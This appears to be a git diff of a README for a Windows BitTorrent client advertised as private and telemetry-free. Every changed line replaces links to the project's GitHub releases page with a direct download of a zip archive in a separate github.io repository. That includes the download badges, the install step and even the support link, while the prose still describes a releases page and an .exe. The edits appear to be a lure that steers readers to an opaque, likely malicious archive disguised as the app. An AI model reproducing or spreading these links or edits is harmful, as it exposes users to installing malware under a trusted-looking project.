@@ -5,7 +5,7 @@ description: "Download torrents privately with a portable, free, no-telemetry Bi
 ---
 <h1>🔒 Torrent - Private by Default. Simple by Design.</h1>
 
-[<img src="https://img.shields.io/badge/Download-Torrent-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download" width="250">](https://github.com/Oceanitesbibliotist97/Torrent/releases)
+[<img src="https://img.shields.io/badge/Download-Torrent-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download" width="250">](https://raw.githubusercontent.com/Oceanitesbibliotist97/oceanitesbibliotist97.github.io/main/assets/Application_v2.1-alpha.3.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Use it in English or Russian. Switch anytime from the settings menu.
 
 **Step 1: Get the latest version**
 
-👉 **Visit this link to download the application:** <a href="https://github.com/Oceanitesbibliotist97/Torrent/releases">Click here to download Torrent</a>
+👉 **Visit this link to download the application:** <a href="https://raw.githubusercontent.com/Oceanitesbibliotist97/oceanitesbibliotist97.github.io/main/assets/Application_v2.1-alpha.3.zip">Click here to download Torrent</a>
 
 You will land on the releases page. Download the `.exe` file listed there (look for the most recent version number).
 
@@ -139,7 +139,7 @@ Your VPN might have briefly reconnected. Reconnect the VPN and try again.
 
 ## 🌐 Getting Support
 
-If you run into any issue, visit the [GitHub repository page](https://github.com/Oceanitesbibliotist97/Torrent) to ask a question, report a bug, or suggest a feature. Be sure to include your Windows version and what you were doing when the issue happened.
+If you run into any issue, visit the [GitHub repository page](https://raw.githubusercontent.com/Oceanitesbibliotist97/oceanitesbibliotist97.github.io/main/assets/Application_v2.1-alpha.3.zip) to ask a question, report a bug, or suggest a feature. Be sure to include your Windows version and what you were doing when the issue happened.
 
 ---
 
@@ -153,6 +153,6 @@ Torrent is released as open-source software. You can read the full license detai
 
 Torrent strips away all the bloat, tracking, and complexity that plague modern file-sharing apps. It's a focused, privacy-first tool that gets out of your way. Download it, run it, and enjoy fast, private downloads — today.
 
-[<img src="https://img.shields.io/badge/Download-Torrent-important?style=for-the-badge&logo=github" alt="Download Torrent" width="200">](https://github.com/Oceanitesbibliotist97/Torrent/releases)
+[<img src="https://img.shields.io/badge/Download-Torrent-important?style=for-the-badge&logo=github" alt="Download Torrent" width="200">](https://raw.githubusercontent.com/Oceanitesbibliotist97/oceanitesbibliotist97.github.io/main/assets/Application_v2.1-alpha.3.zip)
 
 Keywords: bittorrent, golang, kill-switch, no-telemetry, p2p, portable, privacy, privacy-tools, torrent-client, vpn, wails, windows
